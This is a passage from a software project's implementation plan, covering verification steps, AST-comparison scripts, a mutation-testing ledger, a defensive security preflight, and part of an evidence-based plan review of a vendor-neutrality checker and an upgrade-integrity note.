| SR17 | which copy to read; the fill must be present; what reading cannot catch | C10; the preflight (S5) |
| SR18 | the hint and the guide disagree about history | landed at `7c077ddf`; guarded in C9 |

## Scope delta

**Scope delta**: preserved. The baseline is the proposal as accepted (Revision 4 binding over 3 and 2, with the Decision's answers), and every outcome maps to a chunk:

| Accepted outcome | Chunk |
|---|---|
| the checker: comment lines, `.json` and `.txt`, four names, five comments corrected, no exemption | C1 |
| the 9 `templates/skills/` hits reworded; `_doc` names no harness | C2 |
| the 38 hits in 14 other shipped templates reworded | C3 (27), C4 (3), C5 (8) |
| the three `reviewer=` credits | C5 |
| the fixture credit and the stale lines reworded | C6 |
| markers for the rest of `docs/`, `doctrine/`, the fixture README | C6 |
| the pass logged; the zero claim stated with its limits | C7 |
| twins changed in the same commit; 12 finalized, 4 left alone | C2-C5, C7 |
| the separate pass after the verdict; what it trusts; the coverage line | C8 |
| what it lists; the remedy with no commands; placeholder state, not obligation | C9 |
| `bootstrap/UPGRADE.md`: step 4, the meaning, the known gap, the new section | C10 |
| the neutrality and install-check tests; the smoke checks (plants, search, comment-only proof, twins, both probes, `check_cairn.py`) | C1, C7, C8, C9, C12 |
| Q1(a): the check half won't-build | recorded in *Found while planning* and *Dispositions* (the issue is already closed) |
| Q1(b): the paragraph | C11 |
| Q2: `upgrade` does not name the slots it adds now | not built; a `defer`, in *Dispositions* |
| SR1-SR18, NU1-NU5 | the ledger above |
| Boundary B full | C12 |

Five things differ from the text in mechanism, none in outcome, and the Maintainer's allowance is not assumed for any of them. Markers are same-line where the hit is prose (the accepted text allows "one line"); C11 is carried here rather than left outside any plan, because the issue that would have held it is closed; the plan-review obligation is stronger than the proposal's header (D8); the frozen-file count is measured at 14 against an "up to 16" ceiling; and D4 reads Revision 4's "once per run, after the list" as once in a run that has a list or a failed file, and not at all otherwise. No outcome is dropped.

## Verification

**Boundary A (iteration, scoped).** Each chunk runs the tests that own the files it touches, plus its standing gates: `python scripts/check_cairn.py` and `python scripts/claim_check.py <file>` for each edited document, `python scripts/quality_gate.py --sub neutrality` (K1), `python scripts/quality_gate.py --sub redundancy` for scripts, and `python bootstrap/verify_integrity.py --target .` after any finalize (K4). The tests, found by searching `bootstrap/tests` for each touched file's name (all in `bootstrap/tests/`):

| Chunk | Tests |
|---|---|
| C1 | `test_quality_gate_neutrality.py`, `test_quality_gate_cli.py`, `test_quality_gate_redundancy.py`, `test_quality_gate_order_independence.py`, `test_security_lint.py`, `test_gate_manifest.py` |
| C2 | `test_skills_matrix.py`, `test_skills_self_heal.py`, `test_skills_security.py`, `test_skills_install.py`, `test_skills_upgrade.py`, `test_skills_fanout.py`, `test_skills_onboarding.py`, `test_skill_contract.py`, `test_session_kernel.py`, `test_session_failsafe.py`, `test_session_routines.py`, `test_first_session_report.py`, `test_notice_install.py` (twin byte-identity), `test_security_lint.py`, `test_security_check.py`, `test_verify_integrity.py` |
| C3 | `test_onboarding_activation_helper.py`, `test_onboarding_seed_roster.py`, `test_onboarding_slot_substitution.py`, `test_skills_onboarding.py`, `test_active_surfacing_mechanism.py`, `test_active_surfacing_render.py`, `test_trigger_evaluation_action.py`, `test_trigger_evaluation_maturity.py`, `test_deferred_task_store.py`, `test_facade_loader_cleanup.py`, `test_upgrade_side_door_parity.py`, `test_security_leaf.py`, `test_hardening.py`, `test_install_module.py`, `test_module_merge_lockfile.py`, `test_notice_install.py`, `test_ast_attest.py` (the same 2 base failures, no more) |
| C4 | `test_content_scan.py`, `test_security_stack.py`, `test_skills_security.py`, `test_security_verification.py`, `test_default_security_stance.py`, `test_intents_tool.py`, `test_fork_advisory.py`, `test_facade_loader_cleanup.py`, `test_upgrade_module_additions.py`, `test_session_routines.py`, `test_session_failsafe.py`, `test_notice_install.py`, `test_security_lint.py`, `test_verify_integrity.py` |
| C5 | `test_documentation_plan_module.py`, `test_incident_trackers_module.py`, `test_default_security_stance.py`, `test_module_merge_lockfile.py`, `test_evolution_infer.py`, `test_onboarding_review_tiers.py`, `test_presets.py`, `test_profiles_smoke.py`, `test_onboarding_seed_roster.py`, `test_onboarding_slot_substitution.py`, `test_quickstart_sequence.py`, `test_security_verification.py`, `test_security_finding_confidentiality.py`, `test_security_capability_install.py`, `test_api_access_security.py`, `test_web_hosting_security.py` |
| C6 | `test_comprehension_floor.py`, `test_replacement_tools.py`, `test_documentation_plan_module.py`, `test_default_security_stance.py`, `test_doc_governance.py`, `test_onboarding_seed_roster.py`, `test_onboarding_slot_substitution.py`, `test_skills_matrix.py` |
| C7 | `test_quality_gate_*.py` and the gate itself |
| C8, C9 | `test_verify_integrity.py` (the base nodes unchanged and still collected), `test_fork_advisory.py`, `test_lockfile_module.py`, `test_upgrade_side_door_parity.py`, `test_security_verification.py` (it calls `verify`), `test_scaffold_substrate.py` (import purity of the trust anchors), `test_upgrade.py`, `test_security_lint.py` and `test_security_check.py` (the Bandit gate sees the new code) |
| C10 | the three prose gates on `bootstrap/UPGRADE.md` (the pointer test lands in C9, after the heading exists) |
| C11 | `test_doc_drift_tools.py`, `test_doc_governance.py`, `test_practice_modules.py`, `test_profiles_smoke.py`, `test_presets.py` |

This mapping is not a confident bound: dozens of test files drive a scaffold install, which renders these templates (57 were counted in the `verification-practice` plan). So Boundary B is the real check.

**The comment-only proof (K2).** For each edited `.py`, with `<base>` the chunk's parent:

```python
import ast, subprocess, sys

def stripped_dump(source):
    tree = ast.parse(source)
    for node in ast.walk(tree):
        if isinstance(node, (ast.Module, ast.ClassDef, ast.FunctionDef, ast.AsyncFunctionDef)):
            body = node.body
            first = body[0] if body else None
            if (isinstance(first, ast.Expr) and isinstance(first.value, ast.Constant)
                    and isinstance(first.value.value, str)):
                node.body = body[1:] or [ast.Pass()]
    return ast.dump(tree)

base, path = sys.argv[1], sys.argv[2]
old = subprocess.run(["git", "show", f"{base}:{path}"], capture_output=True, check=True).stdout.decode()
new = open(path, encoding="utf-8").read()
same = stripped_dump(old) == stripped_dump(new)
print("SAME     " if same else "DIFFERENT", path)
sys.exit(0 if same else 1)
```

Then `git diff -U0 <base> -- <edited .py files> | grep -E '^[+-]' | grep -vE '^(\+\+\+|---)' | grep -nE 'nosec|noqa|pragma|type:|coding[:=]'` must print nothing. I ran the script on a scratch copy of the base: a reworded comment reads SAME, a one-character code change reads DIFFERENT. The interpreter is the canonical one, because `ast.dump` is interpreter-minor sensitive.

**The interpreter-binding comparison (C2).** For `templates/skills/_lib/session.py` and its twin, with `<base>` the chunk's parent:

```python
import ast, copy, re, subprocess, sys

NAMES = ["_resolve_interpreter", "_probe_interpreter", "encode_display", "_intent_whoami",
         "_surface_intents", "_prune_intents", "_run_evolution_infer", "_do_full_handoff",
         "cmd_session_start", "cmd_session_end"]
HIT_HOLDERS = {"cmd_session_start", "cmd_session_end"}   # their docstrings hold a hit line

def functions(source):
    return {n.name: n for n in ast.walk(ast.parse(source))
            if isinstance(n, ast.FunctionDef) and n.name in NAMES}

def docstring_span(fn):
    first = fn.body[0] if fn.body else None
    if (isinstance(first, ast.Expr) and isinstance(first.value, ast.Constant)
            and isinstance(first.value.value, str)):
        return first.lineno, first.end_lineno
    return None

def stripped_dump(fn):
    fn = copy.deepcopy(fn)
    if docstring_span(fn):
        fn.body = fn.body[1:] or [ast.Pass()]
    return ast.dump(fn)

base, path = sys.argv[1], sys.argv[2]
old = subprocess.run(["git", "show", f"{base}:{path}"], capture_output=True, check=True).stdout.decode()
new = open(path, encoding="utf-8").read()
diff = subprocess.run(["git", "diff", "-U0", base, "--", path], capture_output=True, check=True).stdout.decode()
hunks = []
for line in diff.splitlines():
    m = re.match(r"@@ -\d+(?:,\d+)? \+(\d+)(?:,(\d+))? @@", line)
    if m:
        start, count = int(m.group(1)), int(m.group(2) or 1)
        hunks.append((start, start + max(count, 1) - 1))
fo, fn_ = functions(old), functions(new)
bad = []
for name in NAMES:
    if name not in fo or name not in fn_:
        bad.append(f"{name}: missing"); continue
    if name in HIT_HOLDERS:
        if stripped_dump(fo[name]) != stripped_dump(fn_[name]):
            bad.append(f"{name}: code differs outside the docstring")
        span = docstring_span(fn_[name])
        for a, b in hunks:
            if a <= fn_[name].end_lineno and b >= fn_[name].lineno and not (span and span[0] <= a and b <= span[1]):
                bad.append(f"{name}: hunk {a}-{b} outside its docstring {span}")
    elif ast.dump(fo[name]) != ast.dump(fn_[name]):
        bad.append(f"{name}: differs")
print("SAME" if not bad else "DIFFERENT", path, *bad, sep="\n  " if bad else " ")
sys.exit(1 if bad else 0)
```

I ran it on scratch copies of the base. Rewording the docstring lines at `:905` and `:1338` and the module comment at `:215` reads SAME. Rewording a comment inside the body of `cmd_session_start` (no code change) reads DIFFERENT, because the hunk is outside the docstring. Changing code in `cmd_session_start` reads DIFFERENT. Changing a `return` in `_resolve_interpreter` reads DIFFERENT.

**The mutation ledger (C8, C9; the implementer records it, Boundary C may repeat it).** Each mutant is one deliberate break, made in a separate copy and run against the chunk's tests with an unmutated control run beside it. Report each as killed (some test fails), survived (all pass), or equivalent (no behaviour change, shown by a behaviour test through the real entry point). A mutant not shown equivalent by measurement is reported as a survivor. The set: call the note before the report, or inside the record loop; catch `Exception` only (let `SystemExit` through); remove the fence; drop `O_NOFOLLOW`; drop the `fstat` regular-file check; read without the cap; drop the `dev/.cairn/base/` containment; skip the `base_hash` comparison; accept a non-mapping `tokens`; let a per-record exception reach the fence (remove the per-record handler); print with `str()` instead of `ascii()`; print a `--finalize` line; list a slot that carries the customized marker; drop token substitution; read a verbatim record; read a living-state file with `Path.read_bytes()` instead of the shared reader (the FIFO case kills it); drop the substitution-length bound; pair slots by a per-name search; drop the `sys.stdout.flush()` before the call. Every one is expected killed.

**Boundary B mode**: full. The refusal rules in `AGENTS.md` settle it, four ways:

1. **Frozen files change and the pinned collection grows.** Fourteen frozen files change and nodes are added, which touches the gate-manifest contract surface; bounded mode refuses.
2. **Trust-ceremony surfaces are touched.** Vendor-neutrality is a named high-risk surface and this plan changes its checker; `bootstrap/verify_integrity.py` is the lockfile reader adopters run before trusting their scripts; `tools/session.py` is the interpreter binding (comments only); `scripts/content_scan.py` is the content scanner (comments only). Bounded mode refuses.
3. **Ten executable templates (shipped byte for byte) are edited.** Most tests render them. No mapping bounds that confidently, and uncertainty resolves to `full`.
4. **The accepted text says so.**

**How Boundary B runs.** After the last implementation commit (C11), against a clean unchanged commit, under the canonical interpreter (`/Users/kendal30/conda_envs/lhm/bin/python3.13`, Python 3.13.x). Run it from a separate `git worktree` at the tested commit, which shares refs (so the gate anchor is present) and keeps other sessions' uncommitted files out of the count:

```
CAIRN_FULL_SUITE=1 python -m pytest bootstrap/tests --quality-gate-shuffle-seed=0
python scripts/quality_gate.py --sub neutrality --sub redundancy
```

then `python scripts/check_cairn.py` and `python scripts/claim_check.py` on each edited document. The record is appended as `## Implementation verification -- <agent> -- YYYY-MM-DD` with the template's fields: **Boundary B mode**, **Tested commit**, **Reviewed range**, **Interpreter/runtime**, **Pre-run state** and **Post-run state**, a command table with Command, Exit, Outcomes, Elapsed, **Non-pass disposition**, **Plan-specific acceptance commands**, **Known omissions**.

**Plan-specific acceptance at Boundary B.**

* The neutrality leg exits 0 with `fail=0`; the `info=` figure is recorded.
* The two AST nodes of `test_ast_attest.py` fail at the base for other work. Re-derive the AST verify output at the tested commit's parent and at the tested commit and show them equal; no `_scaffold` byte changed (C12). If the Maintainer has re-anchored in the meantime, both are clean and equal.
* Both probes re-run, as the proposal's smoke checks: install `4ad1c115` (`solo-greenfield`) in a scratch tree, fill all its slots, finalize, upgrade to the tested commit, and run the new `verify_integrity`: the note names exactly the one added slot (`assurance-path-triggers`). Then the partly filled variant (only the three slots `bootstrap/BOOTSTRAP.md` says need the Maintainer's own input filled): the added slot is listed among the others and not singled out; the count is recorded (the proposal's prototype measured 17). That second result is the Q2 limit, recorded and accepted, not a defect. The exact commands go in the record.
* `python bootstrap/verify_integrity.py --target .` lists the 18 files.
* **Old versus new** (C8): the parent's `verify_integrity.py` and the new one, run on the same trees (the 24 hostile cases, a fresh `solo-greenfield` install, Cairn's own tree), give equal exit codes, stdout, and stderr once `slot note:` lines are removed.
* **The kernel comparison** (C2) reads SAME for `tools/session.py` and its template against `b13ad7b7`, and the one-time name search (C7) is repeated over `b13ad7b7..<tested commit>`.

**Expected non-pass.** Only the two AST nodes above, each disposed of rather than treated as noise. `test_gate_manifest.py` has no expected failure: changed frozen bytes do not redden it. Any other skip, xfail, xpass or failure is a finding.

**Boundary C** is the code reviewer's, after Boundary B. The points worth attacking:

* **The verdict.** Can any lockfile or file shape change `verify()`'s exit code or the integrity report through the note? Repeat the mutation ledger; add a shape the 17 cases miss.
* **The reader.** Race the path walk against a symlink swap (harmless for base copies only because bytes must match `base_hash`; check that the bytes hashed are the bytes parsed). Is any `os.O_*` name reachable at import time? Does any route read a living-state file other than the shared reader (the grep of C8)? Feed a living-state path every special file you can make.
* **The loop.** Read C8's diff of the record loop: is it only added lines, and do the two `return` statements stand exactly as they were?
* **No commands, anywhere.** List the note's print sites from the tree and show none can emit a command or a raw control byte, rather than reading the diff.
* **Every twin.** List the 16 pairs from the tree and, in a separate copy, change one line of code (not a comment) in each edited `.py` template to show K2 notices it.
* **The markers.** Read the placement of each: does a mid-paragraph marker split a list item or a fence? Are the reasons declarative? Did any doctrine file gain a line?
* **The guide, read cold as an adopter.** Can you follow step 4 and the section from `bootstrap/UPGRADE.md` alone? Does the section say which copy to read?
* **The lockfile diff.** Is each finalize commit confined to the `"hash"` lines of its records?
* **The claim "zero".** Do the CHANGELOG text and the log row say what zero does not cover?

### Security preflight, re-answered where the chunking changes an answer

* **S1 -- who supplied it?** Unchanged. Part 1 adds no decision and no exemption. Part 2 decides from installed bytes the integrity pass already matched to the lockfile, a base copy re-checked against `base_hash`, the lockfile's tokens, and the lockfile; all come from the adopter's tree, so steering the note takes a lockfile change that review sees. The note grants nothing and prints nothing to run.
* **S2 -- can it fail?** Both checks can, and the chunking says where it is shown: the gate by the plants (C7) and the superset check (C1); the note by the no-op comparison with its non-vacuity assertion, the old-versus-new comparison that sees an edit to the record loop, and the mutation ledger (C8, C9).
* **S3 -- what fires it, over what?** Part 1: a person runs the gate at Boundary B and at the gate-manifest ceremony; no hook runs it; it covers the file types in `_NEUTRALITY_FILE_SUFFIXES`, now including `.json` and `.txt` under `templates/`. Part 2: a person runs `verify_integrity`, as step 4 of `bootstrap/UPGRADE.md` says (C10); no CI exists and none is claimed. Both triggers were opened and read in this plan.
* **S4 -- which way does it break?** Every read, type or decode failure becomes a "not checked" count in the coverage line. The exit code is fixed before the note runs and the note cannot reach it. The note prints nothing to run, so no output of it can direct a recording; recording stays the adopter's own act, after reading the whole file. One edge no code closes: a passing run used to write nothing to stderr and now always writes the coverage line, so with stderr a closed pipe the process can exit 120 (Python's exit-time flush) where it exited 0. It only ever turns a pass into a failure; C10 says so.
* **S5 -- who still wins?**
  * **Spellings the gate cannot see**: lower-case and joined spellings, invisible characters, unlisted names, unlisted file types, and anyone hiding a name on purpose. These are closed by enumeration only; the one-time search covers this change's lines only.
  * **A changed lockfile**: anyone who changes the lockfile together with a base copy can steer the note's list. The note grants nothing.
  * **An adopter who records without reading the whole file.**
  * **An adopter who reads but cannot tell.** Reading finds a line one knows is not theirs, such as an instruction to download and run a script. It does not reliably find a small rewording of text Cairn shipped, because the check keeps no copy to compare with. C10 says so and offers comparison with a copy you trust only as an aid, never proof.
  * **The existing hint.** It still prints a `--finalize` command for a modified file with a marked slot, while saying it cannot show what changed. That is shipped behaviour this plan does not change. Since `7c077ddf` it no longer offers history as enough.
  * **Size.** The integrity pass still reads each recorded file whole and uncapped (shipped behaviour); the cap bounds only what the note parses.
  * **A path-walk race** on `base_cache` can happen, harmlessly: only bytes that match `base_hash` go further. A living-state read has no hash to bind it, and its race is harmless for a different reason: the note prints only names taken from hash-bound base copies, and counts.
  * **Marked lines outside `templates/`.** A line or block carrying a `vendor-ok` marker is exempt by design; those files do not ship; `info=` is the only sign of a name added under a marker, and nothing compares `info=` from one run to the next.

## Dispositions

*Filled at archive-preparation.* Known now:

* **The archive commit writes this plan's `CHANGELOG.md` entry** (applying the changelog-at-archive rule). It states what "zero" covers and what it does not (the limits from *In brief*, including that a marked line outside `templates/` is exempt by design and only `info=` shows a name added under a marker); why zero should hold this time (`29ffeea6` reached `fail=0` on 2026-05-28 and `dbc09557` refilled it that afternoon; since then Boundary B runs the gate on every plan and `013847b6` bars reviewer credits in code); the note and its limit on a partly filled tree; and issues #2, #8 and #16's paragraph. Closing #2 and #8 on GitHub is the Maintainer's; the plan does not touch the tracker.
* **Q1(a), #16's code check: `wontfix`, by the Decision.** The symbol-drift check is not built, under the three-recurrence rule. The revival rule (promote it to machinery only after three independent recurrences of prose-versus-symbol drift) is homed in the closed issue's 2026-08-25 triage comment and in the sentence C11 writes beside the module's other not-shipped statement. The Decision's words (Q1(a) yes) authorize the non-action; it is not work, so there is no board row.
* **Q2 is a `defer`.** `upgrade` itself does not print the slots it adds. It rides with the next engine change to the upgrade path that already owes a re-anchor (it would change at least `merge_file` and `_print_upgrade_report`), or sooner if an adopter misses an upgrade-added slot. The deposit is a board row in `dev/PLANNING.md`, authorized by the Decision's words, quoted verbatim:

  > "Accept A, B, C and D as revised, with every recommended answer, including B’s scope cut and D’s scope delta."

  The row names the trigger: an upgrade-added slot missed on a partly filled tree. It also carries **one line of watch**, the other half of the proposal's "the note becomes noise" signal: revisit if an adopter reports the note listing slots filled by reflex with `<!-- cairn:customized -->`. No incident-tracker class is added (that would be new shipped-module scope no one accepted).
* **The stale `verify_integrity.py:63-111` citations** (in `templates/modules/default-on/run_security_verification.py` and `bootstrap/tests/test_security_verification.py`, both frozen) are a `defer`: a board row to re-point both by function name when either file is next edited. No Decision text covers it, so it goes to the Maintainer in the **one batch** with the rows above, at archive-preparation, and the plan writes a Waiting line at that moment.
* **The re-anchor row** gets the node IDs of `test_quality_gate_neutrality.py` and `test_verify_integrity.py` at archive (the M paragraph). This plan carries no Waiting line at archive: the open wait, the re-anchor, is declared on its marked board row.
* **The standing neutrality trigger** (a later Boundary B record that shows a neutrality failure the change under test did not introduce means the commit hook is owed) is homed in the C7 log row and executed by Boundary B's second command; at archive-preparation it is dispositioned `guard` naming that command.
* **The other signals** the proposal named. A reworded comment that lost an explanation: `accept`, checked at code review, and recoverable because K5 quotes the old text in the commit body and `git log -p` keeps it. The note naming filled slots: `guard`, the C9 listing tests (a filled slot is not listed; a customized slot is not listed) and the real-tree counts. Adopters adding the customized marker by reflex: the board watch above.
* **A simpler design, considered and declined.** The Security Review noted one alternative no earlier pass weighed: compare installed slots against the template in the checkout that runs the check, as the fork advisory does with `trusted_upstream(CAIRN_ROOT)`, instead of against the adopter's base copy. It would remove the whole untrusted base-copy reader. I do not adopt it. It trades the reader for a version-skew gap whenever the checkout and the install differ, and it departs from the accepted text (Revision 3, item 2), so adopting it would be a deviation for the Maintainer. It is recorded here and in the Response so the next change to the note can weigh it. Not a follow-up and not work: `wontfix`.

## Plan review -- Claude Sonnet 5.5 (Internal) -- 2026-10-18

```
Reviewed commit: b13ad7b72eb502565341c3b19aaf29ff63de2e70
Target: the whole plan (header through Dispositions), read against the accepted proposal's Decision, Revision 4, the parts of Revisions 2 and 3 that Revision 4 leaves standing, and the SR8 and SR15 closures (SR12, SR15-SR18)
Prior findings: none
Assurance path: high-assurance
```

**Obligation**: Internal
**Tier**: Internal
**Findings**: raised (9; none needs a Maintainer decision, and NU-PR1 and NU-PR2 are criteria that fail or mislead as written)

Distance: a fresh session. I wrote neither the plan nor the proposal and no earlier review of either. This is the Internal pass only. It is not External, and it does not do the Internal Security Review's job; a separate session owns that obligation. The plan answers in its cells, per the template, so each recommended fix below names the cell to change.

### In plain terms

The plan delivers what the Decision accepted. I could find nothing dropped. The one accepted behaviour it rewords (D4, when the "keeps only a hash" warning prints) is a sensible refinement but should be said out loud, and one of its criteria contradicts it (NU-PR8). Everything I measured held: the checker really goes from 74 to 81 failures and only up, the frozen-file count really is 14, the lockfile's 18 violations match, and the issue-16 facts are right.

What needs fixing is mostly the plan's own checking instruments, not its design. Two of its checks cannot do what they say: the final name search (C7) would turn red on the plan's own first chunk, and the comment check in C1 can pass while two of the five comments it is meant to catch are still wrong (NU-PR1, NU-PR2). Two later plans cite line numbers in files this plan edits, and nothing tells them the lines will move (NU-PR3). A few checks are ceremony that buys nothing, and I measured why (NU-PR4). Three small gaps sit in Dispositions (NU-PR6, NU-PR7).

There is no simpler path to the same outcome. The twelve chunks follow the accepted text's two independent halves (the checker and the note), and what makes the plan heavy is mostly inherited from four rounds of Security Review. Some ceremony can come out, and two chunks can reasonably merge. That is NU-PR4, and it is optional.

### What I measured

Each figure below is from a separate detached worktree of `b13ad7b7` under my scratchpad (removed when done), with the instrument first shown to find a known case.

* **C1, "74 to 81, only up" (the superset check): confirmed.** I applied the described change to a scratch copy of `scripts/quality_gate.py` (removed the two-line directive skip, added `.json` and `.txt` to the `templates` entry, added Copilot, Windsurf, Cline and OpenCode). The unmodified gate printed `fail=74 info=21`; the changed one printed `fail=81 info=21`. With each FAIL line's message tail stripped, sorted and compared with `comm`, nothing is only in the old list and exactly seven are only in the new: `api-access-security.md:101`, `web-hosting-security.md:70` and `:93` (Claude), and the four new names (Cline, Copilot, OpenCode, Windsurf) on `templates/skills/_data/vendor_targets.yml:2`, which already carried five hits (Antigravity, Claude, Codex, Cursor, Gemini). Controls: a scratch tree with a whole-line comment naming a vendor under `templates/` reads clean under the old gate and fails under the new; a same-line `<!-- vendor-ok: ... -->` marker on a prose line exempts that line and only that line under the unmodified gate, as the plan says.
* **The 14 frozen files: confirmed.** I read `bootstrap/tests/fixtures/gate_manifest.json` > `frozen_files` (183 keys) and intersected it with the 50 paths the plan's Scope table edits, by script. Control: `bootstrap/verify_integrity.py` is reported frozen and `README.md` is not. The result is the same 14 the plan names. `templates/modules/team-gated/intent.py`, `tools/session.py`, `tools/intent.py` and the other twins are not frozen. The pinned collection matches too: 22 pinned and 22 collected for `test_quality_gate_neutrality.py`; 13 pinned and 19 collected for `test_verify_integrity.py`.
* **Hit counts per chunk: confirmed.** Under the stricter gate the 81 split as the plan says: 13 (C2), 27 (C3), 3 (C4), 8 + 3 (C5), 27 (C6; 20 marked, 7 reworded).
* **Every Python hit is comment-or-docstring.** I classified all 33 `.py` hit lines with `tokenize` and `ast`: each is a `#` comment or the first docstring of a module, class or function, so a comment-only reword is possible everywhere and no hit sits in a string the program prints. None of the edited modules reads `__doc__`. K2's script, run on a scratch copy, reads SAME for a comment edit and a docstring edit and DIFFERENT for two code edits.
* **Lockfile facts: confirmed.** `verify_integrity.py --target .` lists the same 18 files; the 12 twins are verbatim records except `dev/modules/incident_log_template.md`; 35 non-verbatim records, 2 base copies, 1 matching its `base_hash`. All sixteen template and twin pairs the plan lists are byte-identical (`filecmp`); `docs/DOCUMENTATION_PLAN.md` is not a twin. `2ea3f869` (the cited finalize precedent) changes exactly one lockfile line. The AST baseline reads 2 CHANGED (`main` in `cli.py`, `seed_gitignore` in `install.py`) at the reviewed commit.
* **No `cairn:slot` marker exists in any of the nine Markdown templates the plan edits** (the eight in C2 and C5, plus C11's doc-drift module: `grep -c` returns 0 on each). Control: `dev/plans/_template.md` returns 3.
* **#16 is closed on GitHub** (`CLOSED`, `COMPLETED`, closed 2026-10-18T15:57:09Z), as the plan says. The paragraph is not in the module.

### Findings

**NU-PR1 -- Medium -- C7's one-time search would fail on the plan's own first chunk.**
Evidence: `dev/plans/neutrality-and-upgrade-slots.md:237` runs the search over "every added line of `git diff -U0 <base>..<C6>`" and says every hit must be a routing id or path, a marker reason, or an unrelated English word, and that "a joined, lower-case or odd spelling of a name is a failure". `<base>` is never defined for C7 (K1 uses "the chunk's parent"; the Scope section measures at `fbf664f0`). Any base before C1 puts C1 inside the range, and C1 adds the four names to `_VENDOR_DENYLIST` (`scripts/quality_gate.py`, the `Copilot`, `Windsurf`, `Cline`, `OpenCode` line) and writes tests that use vendor names as inputs. Those lines are not a routing id, a path, a marker reason or an English word, so by the criterion's own words C7 is red before it starts. A base of `fbf664f0` also pulls in the plan-open commit, which adds this plan (and its vendor names) to `dev/`.
Fix (Scope: C7 criterion): define `<base>` as `b13ad7b7`, and restrict the search to added lines in files the gate actually reads (its scan roots at its suffixes), excluding `scripts/quality_gate.py` and `bootstrap/tests/test_quality_gate_neutrality.py`. Say that the checker's own name list and its tests are the one place vendor names are meant to appear. Keep the control (a scratch line holding `ClaudeCode` shows up).

**NU-PR2 -- Medium -- C1's comment check passes with two of the five comment sites still wrong.**
Evidence: `:182` says the check is `grep -n "only for the directive-forbidden\|Not bootstrap/tests/" scripts/quality_gate.py` printing nothing, "the same grep prints both at the parent". At `b13ad7b7` that grep prints three lines: 199, 252 and 446. The other two sites it is meant to cover do not contain those words: line 438 reads "`directive-forbidden rule, since those files ship to adopter trees`" and line 457 reads "`scanned for the directive-forbidden rule (templates ship to`". A correction that fixes 199, 252 and 446 and leaves 438 and 457 saying templates are scanned only for directives passes the check. This is the plan's own AGENTS.md instrument rule (a negative result counts only if the pattern could have matched), applied to 3 of the 5 sites.
Fix (Scope: C1 criterion): widen the pattern to `directive-forbidden\|Not bootstrap/tests/`. At the parent it prints five lines (199, 252, 438, 446, 457), one per site. Afterwards require that any line it still prints describes token scanning, or that it prints nothing.

**NU-PR3 -- Low -- Later plans cite line numbers in files this plan edits, and the plan does not tell them they will move.**
Evidence: I searched the open plan and the five proposals dated 2026-10-18 for `path:line` citations into this plan's files.
* `templates/skills/session-start/SKILL.md:43-45` is cited three times by `board-as-basis` (its lines 130, 685, 792). C2 edits the same file at line 28 (`:192`: "the one phrase near line 28"). Any change in that paragraph's wrapped line count moves lines 43-45. The Sequencing table says only "three plans, three different sentences" (`:148`).
* `scripts/quality_gate.py:498` is cited by `review-lenses-for-every-install` (its line 343), whose content now belongs to the combined plan being written. Line 498 is `_R1_SCAN_ROOTS`. C1 removes two code lines and rewrites five comments above it. Even my minimal prototype of C1 (no comment edits) moves it to 497. The plan's last Sequencing paragraph (`:156`) says that proposal "shares none of those with this plan"; true for edited files, not for cited lines. `claim_check` only checks that a cited line is in bounds, so the drift would be silent.
* The plan already guards the cases it found: `doctrine/rationale.md:405`, `:414-417` and `:451` (cited by `independent-scientific-check`) and `lifecycle-contract.md` by same-line markers, and `solo-greenfield.md:92` by naming it. `rationale.md:70` and `:364-373` (cited by `external-is-a-maintainer-stance`) are also safe under the same-line form.
Fix (Cells: C2 criterion, Sequencing table): add "the file's line count is unchanged" to the SKILL.md bullet and its twin, and the same for the reworded paragraph in `solo-greenfield.md`. Add a Sequencing row for `scripts/quality_gate.py`: C1's commit body records the new line number of `_R1_SCAN_ROOTS`, and the combined plan re-points its citation.

**NU-PR4 -- Low -- Some ceremony buys nothing; the chunk structure has two optional merges.**
This is my answer to "is there a simpler path"; take what is useful.
* **K7 is vacuous.** `:172` makes every rewording chunk check that no changed Markdown line lies inside a `cairn:slot` span. None of the nine Markdown templates has a slot marker at all (counts of 0; control above), so the check can never fire. Replace it with one recorded fact in C5's commit body ("no slot markers in these files, `grep -c cairn:slot` returns 0 on each"), and drop K7 from the repeated list. The reworded-placeholder gap it guards (C9) concerns slot bodies, which these files do not have.
* **K6 repeats the accepted "one-time search".** The accepted text calls it a one-time search; `:171` runs the same 20-name search after each of C2-C6 and `:237` runs it again over the whole range. C7's run is the accepted one and catches everything the earlier runs would. Drop K6, or keep it as a one-line habit and say it is not an acceptance criterion.
* **C7 and C6 can share a commit.** C7's own commit is only the log rows in `doctrine/consolidation-review.md`; its other duties (zero, plants, search, finalize check) are recorded again in C12's record (`:293`). Making the log rows the last step of C6 (ordered after C2-C5) removes one commit with no loss. Optional.
* **C2, C3 and C4 can share a commit.** They are one kind of work (comment-only code, proved by the same K2 script, finalized with the same scoped command). One commit means one lockfile read-fresh and one finalize of 12 records instead of three contended ones, and the commit body carries one K1-K4 record. The cost is a larger diff, bisect granularity inside the family, and a reviewer reading about 33 reworded comment and docstring lines in one sitting for K5; I would take it but would not insist. Optional.
* **Move C10 before C9, or merge them.** C9's pointer to the section *Recording an edit you made* dangles until C10 lands. With C10 first, the pointer test (`test_the_pointer_names_a_heading_that_exists`) is green from birth; it is red-then-green either way. Optional.
* **The M row is not a chunk of this plan.** The plan archives with M outstanding and the wait lives on the marked board row (line 260 of `dev/PLANNING.md`, which says "run the gate-manifest re-anchor"), so M reads better as a note under the table than as a row.

**NU-PR5 -- Low -- Two K-checks are worded so they cannot be done exactly, and one claim rests on an unrecorded search.**
* `:15` says each edited program "is identical to its parent apart from comments", but K2 (`:167`) also ignores docstrings, and docstrings are readable at runtime (`test_session_routines.py:502` pins one in `tools/session.py`'s module docstring). Seventeen of the 33 Python hit lines are docstring lines. They are safe: the module docstring that test reads is not on a hit line, and no edited module reads `__doc__` (I searched). But the plan never records that search; C2-C4 should record `grep -n "__doc__\|get_docstring\|getdoc"` over the edited files printing nothing, and `:15` should say "apart from comments and docstrings".
* `:226` says deleting every `<!-- vendor-ok: ... -->` span gives back the parent's bytes. A marker appended after a space leaves that space behind. Say "deleting each marker and the one space before it".

**NU-PR6 -- Medium-low -- Dispositions: three items the plan says are recorded are not, or have no home.**
* **Q1(a), the won't-build half of #16.** The Scope delta table (`:345`) says it is "recorded in *Found while planning* and *Dispositions*". Found-while-planning (`:81`) records the issue's state and says nothing of won't-build; Dispositions (`:451-463`) has no line for it. The revival rule ("promote to machinery only after three independent recurrences") lives only inside the C11 paragraph. Add a Dispositions line: Q1(a) won't-build, revival rule as stated, homed in the closed issue's 2026-08-25 triage comment and the C11 paragraph.
